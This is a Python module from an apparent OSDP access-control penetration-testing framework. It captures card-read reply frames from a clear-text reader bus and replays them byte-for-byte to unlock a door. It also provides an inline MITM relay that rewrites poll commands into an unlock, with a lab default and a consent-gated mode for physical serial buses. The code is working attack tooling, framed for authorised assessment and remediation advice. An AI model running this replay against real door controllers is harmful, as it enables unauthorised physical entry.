"""ATK-05a clear-text card-presentation replay (the CVE-2024-52288 path is 04-08).

A card-presentation exchange is reusable: an attacker who recorded a genuine
``REPLY_RAW`` (0x50) card-read reply from the PD can, over a clear-text bus with no
channel integrity, present those exact bytes again later to reproduce the same
access-control outcome - no forging, no cryptography, just verbatim reuse of what was
already observed. This is the defining difference from ATK-08 spoof, which crafts a
new frame from attacker-chosen fields; replay never invents content.

- ``capture_card_exchange(frames)`` selects the card-presentation (``REPLY_RAW``)
  frames out of a decoded session, re-encoded to their exact wire bytes via
  ``codec.encode`` - nothing else is selected, and an empty / card-less session yields
  an empty list (the flagged-assumption true negative).
- ``run_replay(captured, inject, lock_state_probe, ...)`` re-injects ``captured``
  byte-for-byte (no text normalization, no re-crafting) via ``inject`` and emits a
  Finding only on an observed locked->unlocked transition; an empty ``captured``
  performs no injection and returns ``[]``.

Door-open is not visible on the wire, so the live demonstration proves itself against
the same single lab PD lock-state signal (D-05) spoof uses, re-triggered through
``spoof.craft_unlock``/``spoof.unlock_transform`` (Task 2's craft helpers, reused here
"for consistency" per the plan) once the live bus is observed carrying the genuine
card-presentation exchange - modelling "replaying a captured card-presentation exchange
reproduces the door-open outcome" without inventing a second crafting primitive.

Import discipline: importable with the standard library plus the stdlib-only Phase 3
modules (codec/framer/constants/transport). ``typer``, ``report`` and ``safety`` are
imported lazily inside the functions that need them.
"""

from __future__ import annotations

import os
from collections.abc import Callable, Iterable, Sequence
from pathlib import Path
from typing import TYPE_CHECKING

from interlock.osdp import codec, constants
from interlock.osdp.codec import OsdpFrame
from interlock.osdp.transport import Direction, TCPTap
from interlock.plugin import Finding, Severity

if TYPE_CHECKING:
    import typer

# ATK-05a free-text ATT&CK id: Transmitted Data Manipulation / AiTM-style replay (T1557).
# Phase 5 enriches it.
_TECHNIQUE = "T1557"

# Lab defaults: listen in the attacker (inline MITM) position and rewrite toward the PD.
_DEFAULT_LISTEN_PORT = 10000
_DEFAULT_UPSTREAM = ("pd", 10000)
_LAB_PORT = 10000

# Trigger file the live lab driver watches: the injection only arms once this path exists, so
# a test can observe a genuinely locked baseline before explicitly arming the replay (the
# ``inject`` half of ``run_replay``'s contract). Created via ``docker compose exec ... touch``.
_TRIGGER_PATH = Path("/tmp/interlock-replay-fire")

# A per-frame injector: transmits one captured frame's exact bytes via the seam.
Inject = Callable[[bytes], None]

# A zero-arg oracle reporting whether the lock-state signal is CURRENTLY observed unlocked.
LockStateProbe = Callable[[], bool]


def capture_card_exchange(frames: Iterable[tuple[Direction, OsdpFrame]]) -> list[bytes]:
    """Return the exact wire bytes of every pd->cp ``REPLY_RAW`` (card-read) frame in ``frames``.

    Selects only the card-presentation frames - nothing else - re-encoded via
    ``codec.encode`` so the returned bytes are ready to re-inject byte-for-byte. A
    session with no card-read reply (or no frames at all) returns ``[]``: the flagged
    true negative, never an invented capture.
    """
    return [
        codec.encode(frame)
        for direction, frame in frames
        if direction is Direction.pd_to_cp and frame.code == constants.REPLY_RAW
    ]


def run_replay(
    captured: Sequence[bytes],
    inject: Inject,
    lock_state_probe: LockStateProbe,
    *,
    technique: str = _TECHNIQUE,
) -> list[Finding]:
    """Re-inject ``captured`` byte-for-byte and emit a Finding only on a locked->unlocked flip.

    An empty ``captured`` performs no injection and returns ``[]`` immediately (the
    flagged-assumption true negative - an empty / single-frame capture claims no
    door-open). Otherwise requires a locked baseline exactly like ``spoof.run_spoof``:
    if ``lock_state_probe()`` already reports unlocked before any frame is injected,
    the transition cannot be attributed to this replay and ``[]`` is returned. Every
    captured frame is passed to ``inject`` unmodified, in order - no re-crafting, no
    text normalization, raw bytes only.
    """
    if not captured:
        return []
    if lock_state_probe():
        return []  # inconclusive: already unlocked, not attributable to this replay
    for frame_bytes in captured:
        inject(frame_bytes)
    if not lock_state_probe():
        return []  # the replay had no observed effect
    return [
        Finding(
            id="ATK-05a-replay-card-exchange",
            title="OSDP PD unlocked by replaying a captured card-presentation exchange",
            severity=Severity.CRITICAL,
            evidence=(
                "The PD's lock-state signal was LOCKED before the replay and flipped to "
                "UNLOCKED after the exact bytes of a previously captured REPLY_RAW "
                "card-presentation reply were re-injected onto the bus, byte-for-byte, "
                "through the in-path seam - no new credential and no re-crafting."
            ),
            attack_technique=technique,
            remediation=(
                "Enable OSDP Secure Channel with MAC+encryption (SCS_17/18) and reject "
                "replayed sequence numbers; a clear-text bus with no freshness guarantee "
                "lets any captured card-presentation exchange be reused verbatim."
            ),
        )
    ]


def serve_replay_lab(target_port: int, upstream: tuple[str, int]) -> None:
    """Serve the inline replay-of-card-exchange rewrite relay against the lab bus (blocking).

    Reuses ``spoof.unlock_transform`` (Task 2's craft helpers, for consistency): once the
    live bus carries a genuine card-presentation exchange, the next cp->pd CMD_POLL is
    rewritten into the unlock that exchange would, in a correctly wired system, have
    produced - re-triggering the same door-open outcome a captured-and-replayed exchange
    demonstrates. Blocks serving connections, like the other attack modules' lab drivers.
    """
    from interlock.osdp.attacks.spoof import unlock_transform

    TCPTap(target_port, upstream).serve_rewrite(unlock_transform())


def _upstream() -> tuple[str, int]:
    """Parse ``ATTACKER_UPSTREAM`` (``host:port``) with a ``pd:10000`` default."""
    raw = os.environ.get("ATTACKER_UPSTREAM", f"pd:{_LAB_PORT}")
    host, _, port = raw.partition(":")
    return host, int(port) if port else _LAB_PORT


def main() -> None:
    """Attacker-container entrypoint: serve the clear-text replay relay (lab default).

    Run by the ``docker-compose.replay.yml`` override as
    ``python -m interlock.osdp.attacks.replay``. The injection only arms once
    ``_TRIGGER_PATH`` exists (``docker compose exec ... touch``), so a live test can confirm
    the PD stays locked beforehand and attribute the transition to an explicit ``inject()``
    call. The CVE-2024-52288 path (``--mode cve``) is added by plan 04-08.
    """
    from interlock.osdp.attacks.spoof import unlock_transform

    upstream = _upstream()
    print(
        f"interlock: replay (cleartext) MITM listening on 0.0.0.0:{_LAB_PORT} "
        f"upstream={upstream[0]}:{upstream[1]}",
        flush=True,
    )
    TCPTap(_LAB_PORT, upstream).serve_rewrite(unlock_transform(armed=_TRIGGER_PATH.exists))


def register(app: typer.Typer) -> None:
    """Attach the ``replay`` subcommand to the ``osdp`` Typer group."""
    import typer

    @app.command("replay")
    def replay(
        mode: str = typer.Option(
            "cleartext",
            "--mode",
            help="cleartext = replay a captured card-presentation exchange (default). "
            "The cve mode is added by a later plan.",
        ),
        port: int = typer.Option(
            _DEFAULT_LISTEN_PORT,
            "--port",
            help="Local TCP port to listen on (attacker inline position, lab default).",
        ),
        upstream_host: str = typer.Option(
            _DEFAULT_UPSTREAM[0],
            "--upstream-host",
            help="Upstream PD host to relay to (lab default).",
        ),
        upstream_port: int = typer.Option(
            _DEFAULT_UPSTREAM[1],
            "--upstream-port",
            help="Upstream PD port to relay to.",
        ),
        physical: bool = typer.Option(
            False,
            "--physical",
            help="Run the replay over a REAL two-segment serial bus, behind the SAFE-02 "
            "consent gate.",
        ),
        device: str = typer.Option(
            "",
            "--device",
            help="CP-side serial device path for --physical (e.g. /dev/ttyUSB0).",
        ),
        upstream_device: str = typer.Option(
            "",
            "--upstream-device",
            help="PD-side serial device path for --physical (e.g. /dev/ttyUSB1).",
        ),
        target: str = typer.Option(
            "",
            "--target",
            help="Scope identifier you are authorized to assess (required for --physical).",
        ),
    ) -> None:
        """Replay a captured clear-text card-presentation exchange via an in-path injection."""
        if mode != "cleartext":
            raise typer.BadParameter("--mode must be 'cleartext' (cve is added by a later plan)")

        from interlock.osdp.attacks.spoof import _serial_unlock_relay

        if physical:
            # The ONLY real-port path: SAFE-02 consent gate before any byte is transmitted.
            from interlock.osdp import transport
            from interlock.osdp.attacks import safety

            if not device or not upstream_device or not target:
                raise typer.BadParameter(
                    "--physical requires --device, --upstream-device and --target"
                )
            cp_endpoint = safety.open_physical_endpoint(device, target)
            try:
                pd_endpoint = transport.open_serial_endpoint(upstream_device)
                try:
                    typer.echo(
                        "Running clear-text replay over the consented serial segments "
                        "(Ctrl-C to stop)."
                    )
                    _serial_unlock_relay(cp_endpoint, pd_endpoint)
                finally:
                    pd_endpoint.close()
            finally:
                cp_endpoint.close()
            return

        typer.echo(
            f"Running clear-text replay MITM on the lab bus: listening on :{port}, "
            f"relaying to {upstream_host}:{upstream_port} (Ctrl-C to stop)."
        )
        serve_replay_lab(port, (upstream_host, upstream_port))


if __name__ == "__main__":
    main()
